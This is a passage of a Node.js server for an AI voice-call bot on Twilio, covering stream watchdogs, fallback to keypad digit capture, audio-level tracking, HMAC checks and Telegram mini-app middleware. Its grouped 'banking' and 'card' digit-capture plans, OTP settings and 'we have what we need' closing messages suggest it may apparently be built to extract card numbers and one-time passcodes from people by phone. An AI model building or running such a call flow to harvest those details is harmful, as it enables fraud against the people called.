          allowHangup: true,
          reason: "watchdog_no_media",
        });
      }
      continue;
    }

    const lastMediaAt = streamLastMediaAt.get(callSid);
    if (!lastMediaAt) continue;
    const sttElapsed = now - (sttLastFrameAt.get(callSid) || lastMediaAt);
    if (sttElapsed > thresholds.sttStallMs) {
      const notified = await handleStreamStallNotice(
        callSid,
        "⚠️ Speech pipeline stalled. Switching to keypad…",
        "sttNotifiedAt",
        state,
      );
      if (notified) {
        await db
          ?.updateCallState?.(callSid, "stt_stalled", {
            at: new Date().toISOString(),
            elapsed_ms: sttElapsed,
          })
          .catch(() => {});
        const session = activeCalls.get(callSid);
        void activateDtmfFallback(
          callSid,
          callConfig,
          session?.gptService,
          session?.interactionCount || 0,
          "stt_stall",
        );
      } else if (
        !state.sttEscalatedAt &&
        sttElapsed > thresholds.sttEscalationMs
      ) {
        state.sttEscalatedAt = now;
        webhookService.addLiveEvent(
          callSid,
          "⚠️ Speech still unavailable. Ending call.",
          { force: true },
        );
        void handleStreamTimeout(callSid, host, {
          allowHangup: true,
          reason: "stt_stall",
        });
      }
    }
  }
}

async function handleStreamTimeout(callSid, host, options = {}) {
  if (!callSid || streamTimeoutCalls.has(callSid)) return;
  const allowHangup = options.allowHangup !== false;
  streamTimeoutCalls.add(callSid);
  let releaseLock = false;
  try {
    const callConfig = callConfigurations.get(callSid);
    const callDetails = await db?.getCall?.(callSid).catch(() => null);
    const statusValue = normalizeCallStatus(
      callDetails?.status || callDetails?.twilio_status,
    );
    const isAnswered =
      Boolean(callDetails?.started_at) ||
      ["answered", "in-progress", "completed"].includes(statusValue);
    if (!isAnswered) {
      console.warn(
        `Skipping stream timeout for ${callSid} (status=${statusValue || "unknown"})`,
      );
      releaseLock = true;
      return;
    }
    const expectation = digitService?.getExpectation?.(callSid);
    if (expectation && config.twilio?.gatherFallback) {
      const prompt =
        expectation.prompt ||
        (digitService?.buildDigitPrompt
          ? digitService.buildDigitPrompt(expectation)
          : "");
      const sent = await digitService.sendTwilioGather(
        callSid,
        expectation,
        { prompt },
        host,
      );
      if (sent) {
        await db
          .updateCallState(callSid, "stream_fallback_gather", {
            at: new Date().toISOString(),
          })
          .catch(() => {});
        return;
      }
    }

    if (
      shouldRetryStream(options.reason) &&
      (await scheduleStreamReconnect(callSid, host, options.reason))
    ) {
      console.warn(
        `Stream retry scheduled for ${callSid} (${options.reason || "unspecified"})`,
      );
      releaseLock = true;
      return;
    }

    if (!allowHangup) {
      console.warn(
        `Stream timeout for ${callSid} resolved without hangup (${options.reason || "unspecified"})`,
      );
      releaseLock = true;
      return;
    }

    if (config.twilio?.accountSid && config.twilio?.authToken) {
      const client = twilio(config.twilio.accountSid, config.twilio.authToken);
      const response = new VoiceResponse();
      response.say(
        "We are having trouble connecting the call. Please try again later.",
      );
      response.hangup();
      await client.calls(callSid).update({ twiml: response.toString() });
    }

    await db
      .updateCallState(callSid, "stream_timeout", {
        at: new Date().toISOString(),
        provider: callConfig?.provider || currentProvider,
      })
      .catch(() => {});
  } catch (error) {
    console.error("Stream timeout handler error:", error);
  } finally {
    if (releaseLock) {
      streamTimeoutCalls.delete(callSid);
    }
  }
}

async function activateDtmfFallback(
  callSid,
  callConfig,
  gptService,
  interactionCount = 0,
  reason = "stt_failure",
) {
  if (!callSid || sttFallbackCalls.has(callSid)) return false;
  if (!digitService) return false;
  const provider = callConfig?.provider || currentProvider;
  if (provider !== "twilio") return false;
  sttFallbackCalls.add(callSid);

  const configToUse = callConfig || callConfigurations.get(callSid);
  if (!configToUse) return false;

  configToUse.digit_intent = { mode: "dtmf", reason, confidence: 1 };
  configToUse.digit_capture_active = true;
  configToUse.call_mode = "dtmf_capture";
  configToUse.flow_state = "capture_pending";
  configToUse.flow_state_reason = reason;
  configToUse.flow_state_updated_at = new Date().toISOString();
  callConfigurations.set(callSid, configToUse);

  await db
    .updateCallState(callSid, "stt_fallback", {
      reason,
      at: new Date().toISOString(),
    })
    .catch(() => {});

  try {
    await applyInitialDigitIntent(
      callSid,
      configToUse,
      gptService,
      interactionCount,
    );
  } catch (error) {
    console.error("Failed to apply digit intent during STT fallback:", error);
  }

  const expectation = digitService.getExpectation(callSid);
  if (expectation && config.twilio?.gatherFallback) {
    const prompt =
      expectation.prompt || digitService.buildDigitPrompt(expectation);
    try {
      const sent = await digitService.sendTwilioGather(callSid, expectation, {
        prompt,
      });
      if (sent) {
        webhookService.addLiveEvent(callSid, "📟 Switching to keypad capture", {
          force: true,
        });
        return true;
      }
    } catch (error) {
      console.error("Twilio gather fallback error:", error);
    }
  }

  const fallbackPrompt = expectation
    ? digitService.buildDigitPrompt(expectation)
    : "Please enter the digits using your keypad.";
  if (gptService) {
    const personalityInfo =
      gptService?.personalityEngine?.getCurrentPersonality?.();
    gptService.emit(
      "gptreply",
      {
        partialResponseIndex: null,
        partialResponse: fallbackPrompt,
        personalityInfo,
        adaptationHistory: gptService?.personalityChanges?.slice(-3) || [],
      },
      interactionCount,
    );
  }
  if (expectation) {
    digitService.markDigitPrompted(
      callSid,
      gptService,
      interactionCount,
      "dtmf",
      {
        allowCallEnd: true,
        prompt_text: fallbackPrompt,
        reset_buffer: true,
      },
    );
    digitService.scheduleDigitTimeout(
      callSid,
      gptService,
      interactionCount + 1,
    );
  }
  return true;
}

function estimateAudioLevelFromBase64(base64 = "") {
  if (!base64) return null;
  let buffer;
  try {
    buffer = Buffer.from(base64, "base64");
  } catch (_) {
    return null;
  }
  if (!buffer.length) return null;
  const step = Math.max(1, Math.floor(buffer.length / 800));
  let sum = 0;
  let count = 0;
  for (let i = 0; i < buffer.length; i += step) {
    sum += Math.abs(buffer[i] - 128);
    count += 1;
  }
  if (!count) return null;
  const level = sum / (count * 128);
  return Math.max(0, Math.min(1, level));
}

function estimateAudioLevelFromBuffer(buffer, options = {}) {
  if (!Buffer.isBuffer(buffer) || !buffer.length) return null;
  const encoding = String(options.encoding || "").toLowerCase();
  if (["pcm", "linear", "linear16", "l16"].includes(encoding)) {
    const minStep = 2;
    let step = Math.max(minStep, Math.floor(buffer.length / 800));
    if (step % 2 !== 0) {
      step += 1;
    }
    let sum = 0;
    let count = 0;
    for (let i = 0; i + 1 < buffer.length; i += step) {
      sum += Math.abs(buffer.readInt16LE(i));
      count += 1;
    }
    if (!count) return null;
    const level = sum / (count * 32768);
    return Math.max(0, Math.min(1, level));
  }
  const step = Math.max(1, Math.floor(buffer.length / 800));
  let sum = 0;
  let count = 0;
  for (let i = 0; i < buffer.length; i += step) {
    sum += Math.abs(buffer[i] - 128);
    count += 1;
  }
  if (!count) return null;
  const level = sum / (count * 128);
  return Math.max(0, Math.min(1, level));
}

function clampLevel(level) {
  if (!Number.isFinite(level)) return null;
  return Math.max(0, Math.min(1, level));
}

function shouldSampleUserAudioLevel(callSid, now = Date.now()) {
  const state = userAudioStates.get(callSid);
  if (!state) return true;
  return now - state.lastTickAt >= liveConsoleAudioTickMs;
}

function updateUserAudioLevel(callSid, level, now = Date.now()) {
  if (!callSid) return;
  const normalized = clampLevel(level);
  if (!Number.isFinite(normalized)) return;
  let state = userAudioStates.get(callSid);
  if (!state) {
    state = { lastTickAt: 0, lastAboveAt: 0, speaking: false };
  }
  if (now - state.lastTickAt < liveConsoleAudioTickMs) {
    return;
  }
  state.lastTickAt = now;
  const currentPhase = webhookService.getLiveConsolePhaseKey?.(callSid);
  if (normalized >= liveConsoleUserLevelThreshold) {
    state.speaking = true;
    state.lastAboveAt = now;
    userAudioStates.set(callSid, state);
    const nextPhase =
      currentPhase === "agent_speaking" || currentPhase === "agent_responding"
        ? "interrupted"
        : "user_speaking";
    webhookService
      .setLiveCallPhase(callSid, nextPhase, {
        level: normalized,
        logEvent: false,
      })
      .catch(() => {});
    return;
  }

  if (state.speaking) {
    if (now - state.lastAboveAt >= liveConsoleUserHoldMs) {
      state.speaking = false;
      userAudioStates.set(callSid, state);
      if (
        currentPhase !== "agent_speaking" &&
        currentPhase !== "agent_responding"
      ) {
        webhookService
          .setLiveCallPhase(callSid, "listening", { level: 0, logEvent: false })
          .catch(() => {});
      }
      return;
    }
    userAudioStates.set(callSid, state);
    if (currentPhase === "user_speaking" || currentPhase === "interrupted") {
      webhookService
        .setLiveCallPhase(callSid, currentPhase, {
          level: normalized,
          logEvent: false,
        })
        .catch(() => {});
    }
  } else {
    userAudioStates.set(callSid, state);
  }
}

function estimateAudioLevelsFromBase64(base64 = "", options = {}) {
  if (!base64)
    return { durationMs: 0, levels: [], intervalMs: options.intervalMs || 160 };
  let buffer;
  try {
    buffer = Buffer.from(base64, "base64");
  } catch (_) {
    return { durationMs: 0, levels: [], intervalMs: options.intervalMs || 160 };
  }
  const length = buffer.length;
  if (!length)
    return { durationMs: 0, levels: [], intervalMs: options.intervalMs || 160 };
  const durationMs = Math.round((length / 8000) * 1000);
  const intervalMs = Math.max(80, Number(options.intervalMs) || 160);
  const maxFrames = Number(options.maxFrames) || 48;
  const frames = Math.min(
    maxFrames,
    Math.max(1, Math.ceil(durationMs / intervalMs)),
  );
  const bytesPerFrame = Math.max(1, Math.floor(length / frames));
  const levels = new Array(frames).fill(0);
  for (let frame = 0; frame < frames; frame += 1) {
    const start = frame * bytesPerFrame;
    const end =
      frame === frames - 1 ? length : Math.min(length, start + bytesPerFrame);
    const span = Math.max(1, end - start);
    const step = Math.max(1, Math.floor(span / 120));
    let sum = 0;
    let count = 0;
    for (let i = start; i < end; i += step) {
      sum += Math.abs(buffer[i] - 128);
      count += 1;
    }
    const level = count ? Math.max(0, Math.min(1, sum / (count * 128))) : 0;
    levels[frame] = level;
  }
  const effectiveInterval = frames
    ? Math.max(80, Math.floor(durationMs / frames))
    : intervalMs;
  return { durationMs, levels, intervalMs: effectiveInterval };
}

function estimateAudioDurationMsFromBase64(base64 = "") {
  if (!base64) return 0;
  let buffer;
  try {
    buffer = Buffer.from(base64, "base64");
  } catch (_) {
    return 0;
  }
  return Math.round((buffer.length / 8000) * 1000);
}

function isGroupedGatherPlan(plan, callConfig = {}) {
  if (!plan) return false;
  const provider = callConfig?.provider || currentProvider;
  return (
    provider === "twilio" &&
    ["banking", "card"].includes(plan.group_id) &&
    plan.capture_mode === "ivr_gather" &&
    isCaptureActiveConfig(callConfig)
  );
}

function startGroupedGather(callSid, callConfig, options = {}) {
  if (!callSid || !digitService?.sendTwilioGather || !digitService?.getPlan)
    return false;
  const plan = digitService.getPlan(callSid);
  if (!isGroupedGatherPlan(plan, callConfig)) return false;
  const expectation = digitService.getExpectation(callSid);
  if (!expectation) return false;
  if (expectation.prompted_at && options.force !== true) return false;
  const prompt = digitService.buildPlanStepPrompt
    ? digitService.buildPlanStepPrompt(expectation)
    : expectation.prompt || digitService.buildDigitPrompt(expectation);
  if (!prompt) return false;
  const sayVoice = resolveTwilioSayVoice(callConfig);
  const sayOptions = sayVoice ? { voice: sayVoice } : null;
  const delayMs = Math.max(
    0,
    Number.isFinite(options.delayMs) ? options.delayMs : 0,
  );
  const preamble = options.preamble || "";
  const gptService = options.gptService || null;
  const interactionCount = Number.isFinite(options.interactionCount)
    ? options.interactionCount
    : 0;
  setTimeout(async () => {
    try {
      const activePlan = digitService.getPlan(callSid);
      const activeExpectation = digitService.getExpectation(callSid);
      if (!activePlan || !activeExpectation) return;
      if (!isGroupedGatherPlan(activePlan, callConfig)) return;
      if (activeExpectation.prompted_at && options.force !== true) return;
      if (
        activeExpectation.plan_id &&
        activePlan.id &&
        activeExpectation.plan_id !== activePlan.id
      )
        return;
      const usePlay = shouldUseTwilioPlay(callConfig);
      const ttsTimeoutMs = Number(config.twilio?.ttsMaxWaitMs) || 1200;
      const preambleUrl = usePlay
        ? await getTwilioTtsAudioUrlSafe(preamble, callConfig, ttsTimeoutMs)
        : null;
      const promptUrl = usePlay
        ? await getTwilioTtsAudioUrlSafe(prompt, callConfig, ttsTimeoutMs)
        : null;
      const sent = await digitService.sendTwilioGather(
        callSid,
        activeExpectation,
        {
          prompt,
          preamble,
          promptUrl,
          preambleUrl,
          sayOptions,
        },
      );
      if (!sent) {
        webhookService.addLiveEvent(
          callSid,
          "⚠️ Gather unavailable; using stream DTMF capture",
          { force: true },
        );
        digitService.markDigitPrompted(
          callSid,
          gptService,
          interactionCount,
          "dtmf",
          {
            allowCallEnd: true,
            prompt_text: [preamble, prompt].filter(Boolean).join(" "),
          },
        );
        if (gptService) {
          const personalityInfo =
            gptService?.personalityEngine?.getCurrentPersonality?.();
          gptService.emit(
            "gptreply",
            {
              partialResponseIndex: null,
              partialResponse: [preamble, prompt].filter(Boolean).join(" "),
              personalityInfo,
              adaptationHistory:
                gptService?.personalityChanges?.slice(-3) || [],
            },
            interactionCount,
          );
        }
        digitService.scheduleDigitTimeout(
          callSid,
          gptService,
          interactionCount,
        );
      }
    } catch (err) {
      console.error("Grouped gather start error:", err);
    }
  }, delayMs);
  return true;
}

function clearSpeechTicks(callSid) {
  const timer = speechTickTimers.get(callSid);
  if (timer) {
    clearInterval(timer);
    speechTickTimers.delete(callSid);
  }
}

function scheduleSpeechTicks(
  callSid,
  phaseKey,
  durationMs,
  level = null,
  options = {},
) {
  if (!callSid) return;
  clearSpeechTicks(callSid);
  const intervalMs = Math.max(80, Number(options.intervalMs) || 200);
  const levels = Array.isArray(options.levels) ? options.levels : null;
  const safeDuration = Math.max(0, Number(durationMs) || 0);
  if (!safeDuration || safeDuration <= intervalMs) {
    webhookService
      .setLiveCallPhase(callSid, phaseKey, { level, logEvent: false })
      .catch(() => {});
    return;
  }
  const start = Date.now();
  webhookService
    .setLiveCallPhase(callSid, phaseKey, { level, logEvent: false })
    .catch(() => {});
  const timer = setInterval(() => {
    const elapsed = Date.now() - start;
    if (elapsed >= safeDuration) {
      clearSpeechTicks(callSid);
      return;
    }
    let nextLevel = level;
    if (levels?.length) {
      const idx = Math.min(
        levels.length - 1,
        Math.floor((elapsed / safeDuration) * levels.length),
      );
      if (Number.isFinite(levels[idx])) {
        nextLevel = levels[idx];
      }
    }
    webhookService
      .setLiveCallPhase(callSid, phaseKey, {
        level: nextLevel,
        logEvent: false,
      })
      .catch(() => {});
  }, intervalMs);
  speechTickTimers.set(callSid, timer);
}

function scheduleSpeechTicksFromAudio(callSid, phaseKey, base64Audio = "") {
  if (!base64Audio) return;
  const { durationMs, levels, intervalMs } = estimateAudioLevelsFromBase64(
    base64Audio,
    { intervalMs: liveConsoleAudioTickMs, maxFrames: 48 },
  );
  const fallbackLevel = estimateAudioLevelFromBase64(base64Audio);
  const startLevel = Number.isFinite(levels?.[0]) ? levels[0] : fallbackLevel;
  scheduleSpeechTicks(callSid, phaseKey, durationMs, startLevel, {
    levels,
    intervalMs,
  });
}

async function applyInitialDigitIntent(
  callSid,
  callConfig,
  gptService = null,
  interactionCount = 0,
) {
  if (!digitService || !callConfig) return null;
  if (callConfig.digit_intent) {
    const existing = {
      intent: callConfig.digit_intent,
      expectation: digitService.getExpectation(callSid) || null,
    };
    if (
      existing.intent?.mode === "dtmf" &&
      callConfig.digit_capture_active !== true
    ) {
      callConfig.digit_capture_active = true;
      callConfig.flow_state = existing.expectation
        ? "capture_active"
        : "capture_pending";
      callConfig.flow_state_reason = existing.intent?.reason || "digit_intent";
      callConfig.flow_state_updated_at = new Date().toISOString();
      callConfigurations.set(callSid, callConfig);
    }
    if (existing.intent?.mode === "dtmf" && existing.expectation) {
      try {
        await digitService.flushBufferedDigits(
          callSid,
          gptService,
          interactionCount,
          "dtmf",
          { allowCallEnd: true },
        );
      } catch (err) {
        console.error("Flush buffered digits error:", err);
      }
    }
    return existing;
  }
  const result = digitService.prepareInitialExpectation(callSid, callConfig);
  callConfig.digit_intent = result.intent;
  if (result.intent?.mode === "dtmf") {
    callConfig.digit_capture_active = true;
    callConfig.flow_state = result.expectation
      ? "capture_active"
      : "capture_pending";
    callConfig.flow_state_reason = result.intent?.reason || "digit_intent";
  } else {
    callConfig.digit_capture_active = false;
    callConfig.flow_state = "normal";
    callConfig.flow_state_reason = result.intent?.reason || "no_signal";
  }
  callConfig.flow_state_updated_at = new Date().toISOString();
  callConfigurations.set(callSid, callConfig);
  if (
    result.intent?.mode === "dtmf" &&
    Array.isArray(result.plan_steps) &&
    result.plan_steps.length
  ) {
    webhookService.addLiveEvent(
      callSid,
      formatDigitCaptureLabel(result.intent, result.expectation),
      { force: true },
    );
  } else if (result.intent?.mode === "dtmf" && result.expectation) {
    webhookService.addLiveEvent(
      callSid,
      `🔢 DTMF intent detected (${result.intent.reason})`,
      { force: true },
    );
  } else {
    webhookService.addLiveEvent(
      callSid,
      `🗣️ Normal call flow (${result.intent?.reason || "no_signal"})`,
      { force: true },
    );
  }
  if (
    result.intent?.mode === "dtmf" &&
    Array.isArray(result.plan_steps) &&
    result.plan_steps.length
  ) {
    webhookService.addLiveEvent(
      callSid,
      `🧭 Digit capture plan started (${result.intent.group_id || "group"})`,
      { force: true },
    );
    const provider = callConfig?.provider || currentProvider;
    const isGroupedPlan = ["banking", "card"].includes(result.intent.group_id);
    const deferTwiml = provider === "twilio" && isGroupedPlan;
    await digitService.requestDigitCollectionPlan(
      callSid,
      {
        steps: result.plan_steps,
        end_call_on_success: true,
        group_id: result.intent.group_id,
        capture_mode: "ivr_gather",
        defer_twiml: deferTwiml,
      },
      gptService,
    );
    return result;
  }
  if (result.intent?.mode === "dtmf" && result.expectation) {
    try {
      await digitService.flushBufferedDigits(
        callSid,
        gptService,
        interactionCount,
        "dtmf",
        { allowCallEnd: true },
      );
    } catch (err) {
      console.error("Flush buffered digits error:", err);
    }
  }
  return result;
}

function resolveHost(req) {
  return (
    config.server?.hostname ||
    req?.headers?.["x-forwarded-host"] ||
    req?.headers?.host ||
    ""
  );
}

const warnOnInvalidTwilioSignature = (req, label = "") =>
  twilioSignature.warnOnInvalidTwilioSignature(req, label, { resolveHost });

const requireValidTwilioSignature = (req, res, label = "") =>
  twilioSignature.requireValidTwilioSignature(req, res, label, { resolveHost });

function buildTwilioStreamTwiml(hostname, options = {}) {
  const response = new VoiceResponse();
  const connect = response.connect();
  const host = hostname || config.server.hostname;
  const params = new URLSearchParams();
  const streamParameters = {};
  if (options.from) params.set("from", String(options.from));
  if (options.to) params.set("to", String(options.to));
  if (options.from) streamParameters.from = String(options.from);
  if (options.to) streamParameters.to = String(options.to);
  if (options.callSid && config.streamAuth?.secret) {
    const timestamp = String(Date.now());
    const token = buildStreamAuthToken(options.callSid, timestamp);
    if (token) {
      params.set("token", token);
      params.set("ts", timestamp);
      streamParameters.token = token;
      streamParameters.ts = timestamp;
    }
  }
  const query = params.toString();
  const url = `wss://${host}/connection${query ? `?${query}` : ""}`;
  const streamOptions = { url, track: TWILIO_STREAM_TRACK };
  if (Object.keys(streamParameters).length) {
    streamOptions.parameters = streamParameters;
  }
  connect.stream(streamOptions);
  return response.toString();
}

function buildInboundHoldTwiml(hostname) {
  const response = new VoiceResponse();
  const host = hostname || config.server.hostname;
  const pauseSeconds = 10;
  response.pause({ length: pauseSeconds });
  response.redirect({ method: "POST" }, `https://${host}/incoming?wait=1`);
  return response.toString();
}

function shouldBypassHmac(req) {
  const path = req.path || "";
  if (!path) return false;
  if (
    req.method === "GET" &&
    (path === "/" || path === "/favicon.ico" || path === "/health")
  ) {
    return true;
  }
  if (path.startsWith("/webhook/")) return true;
  return HMAC_BYPASS_PATH_PREFIXES.some((prefix) => path.startsWith(prefix));
}

function verifyHmacSignature(req) {
  const secret = config.apiAuth?.hmacSecret;
  if (!secret) {
    return { ok: true, skipped: true, reason: "missing_secret" };
  }

  const timestampHeader = req.headers[HMAC_HEADER_TIMESTAMP];
  const signatureHeader = req.headers[HMAC_HEADER_SIGNATURE];

  if (!timestampHeader || !signatureHeader) {
    return { ok: false, reason: "missing_headers" };
  }

  const timestamp = Number(timestampHeader);
  if (!Number.isFinite(timestamp)) {
    return { ok: false, reason: "invalid_timestamp" };
  }

  const maxSkewMs = Number(config.apiAuth?.maxSkewMs || 300000);
  const now = Date.now();
  if (Math.abs(now - timestamp) > maxSkewMs) {
    return { ok: false, reason: "timestamp_out_of_range" };
  }

  const payload = buildHmacPayload(req, String(timestampHeader));
  const expected = crypto
    .createHmac("sha256", secret)
    .update(payload)
    .digest("hex");

  try {
    const expectedBuf = Buffer.from(expected, "hex");
    const providedBuf = Buffer.from(String(signatureHeader), "hex");
    if (expectedBuf.length !== providedBuf.length) {
      return { ok: false, reason: "invalid_signature" };
    }
    if (!crypto.timingSafeEqual(expectedBuf, providedBuf)) {
      return { ok: false, reason: "invalid_signature" };
    }
  } catch (error) {
    return { ok: false, reason: "invalid_signature" };
  }

  return { ok: true };
}

function selectWsProtocol(protocols) {
  if (!protocols) return false;
  if (Array.isArray(protocols) && protocols.length) return protocols[0];
  if (protocols instanceof Set) {
    const iter = protocols.values().next();
    return iter.done ? false : iter.value;
  }
  if (typeof protocols === "string") return protocols;
  return false;
}

const app = express();
ExpressWs(app, null, {
  wsOptions: {
    handleProtocols: (protocols) => selectWsProtocol(protocols),
  },
});
// Trust the first proxy (ngrok/load balancer) so rate limiting can read X-Forwarded-For safely
app.set("trust proxy", 1);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const apiLimiter = rateLimit({
  windowMs: config.server?.rateLimit?.windowMs || 60000,
  max: config.server?.rateLimit?.max || 300,
  standardHeaders: true,
  legacyHeaders: false,
});

const miniappLimiter = rateLimit({
  windowMs: config.miniapp?.rateLimit?.windowMs || 60000,
  max: config.miniapp?.rateLimit?.max || 120,
  standardHeaders: true,
  legacyHeaders: false,
});

const webappLimiter = rateLimit({
  windowMs: config.miniapp?.rateLimit?.windowMs || 60000,
  max: config.miniapp?.rateLimit?.max || 120,
  standardHeaders: true,
  legacyHeaders: false,
});

const webappAuthLimiter = rateLimit({
  windowMs: config.miniapp?.rateLimit?.windowMs || 60000,
  max: Math.min(30, config.miniapp?.rateLimit?.max || 120),
  standardHeaders: true,
  legacyHeaders: false,
});

function miniappSecurityHeaders(req, res, next) {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("Referrer-Policy", "no-referrer");
  res.setHeader(
    "Permissions-Policy",
    "camera=(), microphone=(), geolocation=()",
  );
  res.setHeader("Cross-Origin-Resource-Policy", "same-site");
  res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
  res.setHeader("Cross-Origin-Embedder-Policy", "unsafe-none");
  return next();
}

function miniappCorsHeaders(req, res, next) {
  const origin = resolveMiniappOrigin(req);
  if (origin && isMiniappOriginAllowed(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Vary", "Origin");
    res.setHeader("Access-Control-Allow-Credentials", "true");
    res.setHeader(
      "Access-Control-Allow-Headers",
      "Authorization, Content-Type, Idempotency-Key, X-Request-Id, X-Telegram-Init-Data, X-Telegram-Initdata, X-Telegram-Init",
    );
    res.setHeader(
      "Access-Control-Allow-Methods",
      "GET,POST,PUT,DELETE,OPTIONS",
    );
    if (req.method === "OPTIONS") {
      return res.status(204).end();
    }
  }
  return next();
}

function miniappRequestLogger(req, res, next) {
  const requestId = req.headers["x-request-id"] || uuidv4();
  req.requestId = requestId;
  res.setHeader("x-request-id", requestId);
  const start = Date.now();
  res.on("finish", () => {
    const userId =
      req.miniappInitUser?.id || req.miniappSession?.user?.id || null;
    const entry = {
      type: "miniapp.request",
      request_id: requestId,
      method: req.method,
      path: req.originalUrl.split("?")[0],
      status: res.statusCode,
      duration_ms: Date.now() - start,
      user_id: userId ? String(userId) : null,
    };
    console.log(JSON.stringify(entry));
  });
  return next();
}

function webappRequestLogger(req, res, next) {
  const requestId = req.headers["x-request-id"] || uuidv4();
  req.requestId = requestId;
  res.setHeader("x-request-id", requestId);
  const start = Date.now();
  res.on("finish", () => {
    const userId =
      req.webappSession?.user?.id || req.miniappInitUser?.id || null;
    const entry = {
      type: "webapp.request",
      request_id: requestId,
      method: req.method,
      path: req.originalUrl.split("?")[0],
      status: res.statusCode,
      duration_ms: Date.now() - start,
      user_id: userId ? String(userId) : null,
    };
    console.log(JSON.stringify(entry));
  });
  return next();
}

function logWebappAuthEvent(req, action, metadata = {}, userIdOverride = null) {
  const userId = userIdOverride || req.miniappInitUser?.id || "unknown";
  db?.logMiniappAudit?.({
    user_id: String(userId),
    action,
    metadata,
    ip: req.ip,
    user_agent: req.headers["user-agent"],
  }).catch(() => {});
}

function sanitizeTelemetryValue(value) {
  if (value == null) return null;
  if (typeof value === "number") return value;
  if (typeof value === "string") {
    if (value.length > 120) return value.slice(0, 120);
    return value;
  }
  if (typeof value === "boolean") return value;
  return null;
}

function sanitizeTelemetryData(data = {}) {
  const filtered = {};
  const blockedKeys = [
    "phone",
    "otp",
    "token",
    "secret",
    "init",
    "authorization",
    "sid",
  ];
  Object.entries(data || {}).forEach(([key, value]) => {
    const lower = key.toLowerCase();
    if (blockedKeys.some((blocked) => lower.includes(blocked))) return;
    const sanitized = sanitizeTelemetryValue(value);
    if (sanitized !== null) {
      filtered[key] = sanitized;
    }
  });
  return filtered;
}

app.use((req, res, next) => {
  if (shouldBypassHmac(req)) {
    return next();
  }

  const verification = verifyHmacSignature(req);
  if (!verification.ok) {
    console.warn(
      `⚠️ Rejected request due to invalid HMAC (${verification.reason}) ${req.method} ${req.originalUrl}`,
    );
    return res.status(401).json({ success: false, error: "Unauthorized" });
  }
  return next();
});

app.use((req, res, next) => {
  if (shouldBypassHmac(req)) {
    return next();
  }
  return apiLimiter(req, res, next);
});

app.use(
  "/miniapp",
  miniappLimiter,
  miniappSecurityHeaders,
  miniappCorsHeaders,
  requireMiniappOrigin,
  requireMiniappInitData,
  miniappRequestLogger,
);
app.use(
  "/webapp",
  webappLimiter,
  miniappSecurityHeaders,
  miniappCorsHeaders,
  requireMiniappOrigin,
  webappRequestLogger,
);

const PORT = config.server?.port || 3000;

// Enhanced call configurations with function context
const callConfigurations = new Map();
const callDirections = new Map();
const activeCalls = new Map();
const callFunctionSystems = new Map(); // Store generated functions per call
const callEndLocks = new Map();
const gatherEventDedupe = new Map();
const silenceTimers = new Map();
const twilioTtsCache = new Map();
const twilioTtsPending = new Map();
const TWILIO_TTS_CACHE_TTL_MS =
  Number(config.twilio?.ttsCacheTtlMs) || 10 * 60 * 1000;
const TWILIO_TTS_CACHE_MAX = Number(config.twilio?.ttsCacheMax) || 200;
const TWILIO_TTS_MAX_CHARS = Number(config.twilio?.ttsMaxChars) || 500;
const TWILIO_TTS_FETCH_TIMEOUT_MS =
  Number(config.twilio?.ttsFetchTimeoutMs) || 4000;
const pendingStreams = new Map(); // callSid -> timeout to detect missing websocket
const streamFirstMediaTimers = new Map();
const streamFirstMediaSeen = new Set();
const gptQueues = new Map();
const normalFlowBuffers = new Map();
const normalFlowProcessing = new Set();
const normalFlowLastInput = new Map();
const speechTickTimers = new Map();
const userAudioStates = new Map();

function enqueueGptTask(callSid, task) {
  if (!callSid || typeof task !== "function") {
    return Promise.resolve();
  }
  const current = gptQueues.get(callSid) || Promise.resolve();
  const next = current
    .then(task)
    .catch((err) => {
      console.error("GPT queue error:", err);
    })
    .finally(() => {
      if (gptQueues.get(callSid) === next) {
        gptQueues.delete(callSid);
      }
    });
  gptQueues.set(callSid, next);
  return next;
}

function clearGptQueue(callSid) {
  if (callSid) {
    gptQueues.delete(callSid);
  }
}

function clearNormalFlowState(callSid) {
  if (!callSid) return;
  normalFlowBuffers.delete(callSid);
  normalFlowProcessing.delete(callSid);
  normalFlowLastInput.delete(callSid);
}

function shouldSkipNormalInput(callSid, text, windowMs = 2000) {
  const cleaned = String(text || "").trim();
  if (!cleaned) return true;
  const last = normalFlowLastInput.get(callSid);
  const now = Date.now();
  if (last && last.text === cleaned && now - last.at < windowMs) {
    return true;
  }
  normalFlowLastInput.set(callSid, { text: cleaned, at: now });
  return false;
}

async function processNormalFlowTranscript(
  callSid,
  text,
  gptService,
  getInteractionCount,
  setInteractionCount,
) {
  if (!callSid || !gptService) return;
  const cleaned = String(text || "").trim();
  if (!cleaned) return;
  if (shouldSkipNormalInput(callSid, cleaned)) return;

  normalFlowBuffers.set(callSid, { text: cleaned, at: Date.now() });
  if (normalFlowProcessing.has(callSid)) {
    return;
  }
  normalFlowProcessing.add(callSid);
  try {
    while (normalFlowBuffers.has(callSid)) {
      const next = normalFlowBuffers.get(callSid);
      normalFlowBuffers.delete(callSid);
      await enqueueGptTask(callSid, async () => {
        if (callEndLocks.has(callSid)) return;
        const session = activeCalls.get(callSid);
        if (session?.ending) return;
        const currentCount =
          typeof getInteractionCount === "function" ? getInteractionCount() : 0;
        try {
          await gptService.completion(next.text, currentCount);
        } catch (gptError) {
          console.error("GPT completion error:", gptError);
          webhookService.addLiveEvent(callSid, "⚠️ GPT error, retrying", {
            force: true,
          });
        }
        const nextCount = currentCount + 1;
        if (typeof setInteractionCount === "function") {
          setInteractionCount(nextCount);
        }
      });
    }
  } finally {
    normalFlowProcessing.delete(callSid);
  }
}

const ALLOWED_TWILIO_STREAM_TRACKS = new Set([
  "inbound_track",
  "outbound_track",
  "both_tracks",
]);
const TWILIO_STREAM_TRACK = ALLOWED_TWILIO_STREAM_TRACKS.has(
  (process.env.TWILIO_STREAM_TRACK || "").toLowerCase(),
)
  ? process.env.TWILIO_STREAM_TRACK.toLowerCase()
  : "inbound_track";

const CALL_END_MESSAGES = {
  success: "Thanks, we have what we need. Goodbye.",
  failure:
    "We could not verify the information provided. Thank you for your time. Goodbye.",
  no_response: "We did not receive a response. Thank you and goodbye.",
  user_goodbye: "Thanks for your time. Goodbye.",
  error: "I am having trouble right now. Thank you and goodbye.",
};
const CLOSING_MESSAGE =
  "Thank you—your input has been received. Your request is complete. Goodbye.";
const DIGIT_SETTINGS = {
  otpLength: 6,
  otpMaxRetries: 3,
  otpDisplayMode: "masked",
